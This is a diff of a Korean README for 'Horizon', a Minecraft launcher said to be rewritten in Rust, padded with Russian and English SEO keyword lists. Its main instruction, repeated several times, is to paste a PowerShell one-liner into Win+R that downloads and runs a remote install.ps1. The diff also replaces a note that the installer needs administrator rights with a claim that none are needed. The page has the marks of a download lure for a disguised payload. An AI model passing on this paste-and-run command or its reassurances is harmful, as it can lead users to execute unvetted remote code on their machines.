@@ -12,7 +12,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 2. **붙여넣기.** Ctrl+V — 아래 명령을 붙입니다.
 3. **Enter.** Horizon이 설치되고 열립니다. 그다음 준비 → 플레이.
 
-<p align="center">UAC를 확인하세요. 설치 프로그램과 런처는 관리자 권한으로 실행됩니다(horizonlauncher.net과 동일).
+<p align="center">관리자 권한 불필요. Windows가 PowerShell을 물으면 확인하세요. 명령은 horizonlauncher.net의 `install.ps1`만 받습니다.</p>
 
 <p align="center">
   <a href="https://horizonlauncher.net/horizon-launcher-setup.exe"><strong>일반 설치 — Horizon 다운로드 setup.exe</strong></a>
@@ -37,8 +37,6 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
     <img src="https://horizonlauncher.net/media/logo.png" width="120" height="120" alt="Horizon Minecraft launcher">
   </a>
 </p>
-
-<p align="center"><em>Обновлено 2026-11-16: лаунчер <strong>0.2.69</strong>, LGPL, Win+R, UAC. Скачивание только с <a href="https://horizonlauncher.net/">horizonlauncher.net</a>.</em></p>
 
 <h1 align="center">Horizon 다운로드 — Rust로 만든 Minecraft 런처 (Minecraft Rust Edition)</h1>
 
@@ -74,7 +72,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 ## Horizon 영상과 GIF
 
-사이트의 전체 MP4: [4K fly](https://horizonlauncher.net/media/mod-spotlight/reels/runaway.mp4) · [Nether](https://horizonlauncher.net/media/mod-spotlight/reels/nether.mp4) · [Shaders](https://horizonlauncher.net/media/mod-spotlight/reels/shaders.mp4) · [TNT](https://horizonlauncher.net/media/mod-spotlight/blast.mp4) · [обзор](https://horizonlauncher.net/media/mod-spotlight/reels/overview.mp4)
+사이트의 전체 MP4: [4K fly](https://horizonlauncher.net/media/mod-spotlight/reels/runaway.mp4) · [Nether](https://horizonlauncher.net/media/mod-spotlight/reels/nether.mp4) · [Shaders](https://horizonlauncher.net/media/mod-spotlight/reels/shaders.mp4) · [TNT](https://horizonlauncher.net/media/mod-spotlight/blast.mp4) · [overview](https://horizonlauncher.net/media/mod-spotlight/reels/overview.mp4) · [gallery](https://horizonlauncher.net/gallery/)
 
 <p align="center">
   <a href="https://horizonlauncher.net/"><img src="media/fly.gif" width="740" alt="Horizon 다운로드 — Rust 클라이언트 4K 비행"></a>
@@ -91,9 +89,24 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 <p align="center"><i>TNT 테스트 — JVM 없이 폭발을 그립니다.</i></p>
 
 <p align="center">
-  <a href="https://horizonlauncher.net/"><img src="https://horizonlauncher.net/media/shots/fps-1292.webp" width="360" alt="Horizon 1292 FPS"></a>
-  <a href="https://horizonlauncher.net/launcher/"><img src="https://horizonlauncher.net/media/shots/launcher.webp" width="360" alt="Horizon launcher"></a>
-  <a href="https://horizonlauncher.net/download-horizon/"><img src="https://horizonlauncher.net/media/shots/survival-hq.webp" width="360" alt="Horizon survival"></a>
+  <a href="https://horizonlauncher.net/performance/"><img src="https://horizonlauncher.net/media/shots/fps-1292.webp" width="330" alt="Horizon 1292 FPS Minecraft Rust"></a>
+  <a href="https://horizonlauncher.net/performance/"><img src="https://horizonlauncher.net/media/shots/bench.webp" width="330" alt="Horizon FPS benchmark"></a>
+  <a href="https://horizonlauncher.net/launcher/"><img src="https://horizonlauncher.net/media/shots/launcher.webp" width="330" alt="Horizon launcher UI"></a>
+</p>
+<p align="center">
+  <a href="https://horizonlauncher.net/"><img src="https://horizonlauncher.net/media/shots/survival-hq.webp" width="330" alt="Horizon survival"></a>
+  <a href="https://horizonlauncher.net/minecraft-rust/"><img src="https://horizonlauncher.net/media/shots/nether-hq.webp" width="330" alt="Horizon Nether"></a>
+  <a href="https://horizonlauncher.net/performance/"><img src="https://horizonlauncher.net/media/shots/night-hq.webp" width="330" alt="Horizon night scene"></a>
+</p>
+<p align="center">
+  <a href="https://horizonlauncher.net/"><img src="https://horizonlauncher.net/media/shots/plains.webp" width="330" alt="Horizon plains"></a>
+  <a href="https://horizonlauncher.net/"><img src="https://horizonlauncher.net/media/shots/sunset-hq.webp" width="330" alt="Horizon sunset"></a>
+  <a href="https://horizonlauncher.net/"><img src="https://horizonlauncher.net/media/shots/underwater-hq.webp" width="330" alt="Horizon underwater"></a>
+</p>
+<p align="center">
+  <a href="https://horizonlauncher.net/launcher/"><img src="https://horizonlauncher.net/media/shots/settings.webp" width="330" alt="Horizon graphics settings"></a>
+  <a href="https://horizonlauncher.net/download-horizon/"><img src="https://horizonlauncher.net/media/shots/patch-notes.webp" width="330" alt="Horizon patch notes"></a>
+  <a href="https://horizonlauncher.net/"><img src="https://horizonlauncher.net/media/shots/fps-294.webp" width="330" alt="Horizon high FPS"></a>
 </p>
 
 
@@ -155,7 +168,7 @@ Horizon은 계속 관리됩니다. 패치가 정기적으로 나옵니다. 버�
 
 - Windows 10 / Windows 11 x64
 - `horizon-launcher-setup.exe`
-- Horizon **0.2.54**
+- Horizon **0.2.69**
 - 무료 · 사이트는 러시아어와 영어
 
 ## Horizon 설치 — 두 가지 방법
@@ -200,6 +213,32 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 - Windows x64 · GPU DX12 / Vulkan · 디스크의 아무 Minecraft 버전
 
 
+## Horizon Minecraft features (Java client in Rust)
+
+**Horizon** reimplements **Minecraft: Java Edition 26.3** in **Rust**: same worlds, rules and terrain, native rendering instead of the JVM. Install via the **Horizon launcher** from **[horizonlauncher.net](https://horizonlauncher.net/en/)**.
+
+| Search intent | Keywords | Canonical URL |
+|---------------|----------|---------------|
+| Download | download Horizon, Horizon setup exe, Win+R install | [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) |
+| Performance | Minecraft on Rust, higher FPS Java, Rust Minecraft client | [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/) · [https://horizonlauncher.net/en/performance/](https://horizonlauncher.net/en/performance/) |
+| Mods | Distant Horizons, Create, Horizon shaders | [https://horizonlauncher.net/en/distant-horizons/](https://horizonlauncher.net/en/distant-horizons/) · [https://horizonlauncher.net/en/create-mod/](https://horizonlauncher.net/en/create-mod/) · [https://horizonlauncher.net/en/shaders/](https://horizonlauncher.net/en/shaders/) |
+| Multiplayer | Java servers, LAN | [https://horizonlauncher.net/en/server/](https://horizonlauncher.net/en/server/) |
+| Legal | LGPL, unofficial | [https://horizonlauncher.net/en/legal/](https://horizonlauncher.net/en/legal/) |
+
+### Parity and FPS
+
+Upstream uses **hundreds of differential harnesses** comparing vanilla Java and Horizon Rust on identical inputs. Search **download Horizon Minecraft** for **higher FPS** than the JVM client.
+
+### In-game highlights
+
+Singleplayer & LAN, **LOD** terrain, gamepads, native **`.hnmod`** mods, **shader API 0.2**, **LGPL** from 0.2.69.
+
+### Recent launcher patches
+
+**0.2.69** LGPL · **0.2.68** UX · **0.2.67** shader API 0.2 · **0.2.66–0.2.65** networking & downloads. Notes: [https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases).
+
+Win+R: `irm https://horizonlauncher.net/install.ps1 | iex` · setup: **[horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)**
+
 ## 왜 Rust Minecraft인가
 
 바닐라는 JVM 위에서 돕니다. Horizon은 네이티브 Rust 클라이언트입니다:
@@ -242,7 +281,7 @@ Horizon Rust 클라이언트에는 필요 없습니다.
 
 `Horizon 다운로드` `Horizon 런처` `Rust 마인크래프트` `Minecraft Rust Edition` `마인크래프트 FPS` `horizonlauncher.net` `Win+R Horizon` `Horizon Win+R install` `Horizon setup.exe`
 
-`скачать Horizon` `скачать Horizon бесплатно` `скачать Horizon Minecraft` `скачать Horizon лаунчер` `скачать Horizon Windows` `скачать Horizon Windows 10` `скачать Horizon Windows 11` `скачать Horizon x64` `скачать Horizon 64 bit` `скачать Horizon setup` `скачать Horizon exe` `скачать Horizon installer` `скачать Horizon установщик` `скачать Horizon 0.2.54` `скачать Horizon 2026` `скачать Horizon официальный` `скачать Horizon с официального сайта` `скачать Horizon horizonlauncher.net` `скачать Horizon github` `скачать Horizon launcher github` `Horizon Minecraft скачать` `Horizon Minecraft бесплатно` `Horizon Minecraft лаунчер` `Horizon Minecraft Windows` `Horizon Minecraft Rust` `Horizon Minecraft на Rust` `Horizon Minecraft Rust Edition` `лаунчер Horizon` `лаунчер Horizon скачать` `лаунчер Horizon Windows` `лаунчер Horizon Minecraft` `лаунчер Horizon Minecraft Java` `установить Horizon` `установка Horizon` `как скачать Horizon` `как установить Horizon` `как поставить Horizon` `быстрая установка Horizon` `обычная установка Horizon` `Win+R Horizon` `Horizon Win+R` `команда Win+R Horizon` `powershell Horizon` `irm install.ps1 Horizon` `install.ps1 horizonlauncher.net` `horizon-launcher-setup.exe` `Horizon setup.exe` `Minecraft на Rust` `Minecraft Rust Edition` `клиент Minecraft на Rust` `клиент Minecraft Rust` `Rust клиент Minecraft` `нативный клиент Minecraft` `Minecraft без JVM` `Minecraft без Java` `Minecraft Java на Rust` `альтернатива официальному лаунчеру Minecraft` `лаунчер Minecraft Windows` `лаунчер Minecraft Java` `скачать лаунчер Minecraft` `лучший лаунчер Minecraft FPS` `высокий FPS Minecraft` `поднять FPS Minecraft` `Minecraft не лагает` `оптимизация Minecraft Java` `FPS Minecraft Java` `Horizon 0.2.54` `Horizon launcher` `download Horizon` `download Horizon Minecraft` `download Horizon launcher` `download Horizon Windows setup` `Horizon Minecraft launcher download` `Minecraft on Rust` `Minecraft Rust Edition download` `Rust Minecraft client` `Horizon Rust Edition` `free Horizon launcher` `Horizon github` `Horizon Minecraft GitHub` `GitHub Horizon launcher`
+`скачать Horizon` `скачать Horizon бесплатно` `скачать Horizon Minecraft` `скачать Horizon лаунчер` `скачать Horizon Windows` `скачать Horizon Windows 10` `скачать Horizon Windows 11` `скачать Horizon x64` `скачать Horizon 64 bit` `скачать Horizon setup` `скачать Horizon exe` `скачать Horizon installer` `скачать Horizon установщик` `скачать Horizon 0.2.69` `скачать Horizon 2026` `скачать Horizon официальный` `скачать Horizon с официального сайта` `скачать Horizon horizonlauncher.net` `скачать Horizon github` `скачать Horizon launcher github` `Horizon Minecraft скачать` `Horizon Minecraft бесплатно` `Horizon Minecraft лаунчер` `Horizon Minecraft Windows` `Horizon Minecraft Rust` `Horizon Minecraft на Rust` `Horizon Minecraft Rust Edition` `лаунчер Horizon` `лаунчер Horizon скачать` `лаунчер Horizon Windows` `лаунчер Horizon Minecraft` `лаунчер Horizon Minecraft Java` `установить Horizon` `установка Horizon` `как скачать Horizon` `как установить Horizon` `как поставить Horizon` `быстрая установка Horizon` `обычная установка Horizon` `Win+R Horizon` `Horizon Win+R` `команда Win+R Horizon` `powershell Horizon` `irm install.ps1 Horizon` `install.ps1 horizonlauncher.net` `horizon-launcher-setup.exe` `Horizon setup.exe` `Minecraft на Rust` `Minecraft Rust Edition` `клиент Minecraft на Rust` `клиент Minecraft Rust` `Rust клиент Minecraft` `нативный клиент Minecraft` `Minecraft без JVM` `Minecraft без Java` `Minecraft Java на Rust` `альтернатива официальному лаунчеру Minecraft` `лаунчер Minecraft Windows` `лаунчер Minecraft Java` `скачать лаунчер Minecraft` `лучший лаунчер Minecraft FPS` `высокий FPS Minecraft` `поднять FPS Minecraft` `Minecraft не лагает` `оптимизация Minecraft Java` `FPS Minecraft Java` `Horizon 0.2.54` `Horizon launcher` `download Horizon` `download Horizon Minecraft` `download Horizon launcher` `download Horizon Windows setup` `Horizon Minecraft launcher download` `Minecraft on Rust` `Minecraft Rust Edition download` `Rust Minecraft client` `Horizon Rust Edition` `free Horizon launcher` `Horizon github` `Horizon Minecraft GitHub` `GitHub Horizon launcher`
 
 ### Horizon 다운로드 / Win+R / setup.exe
 
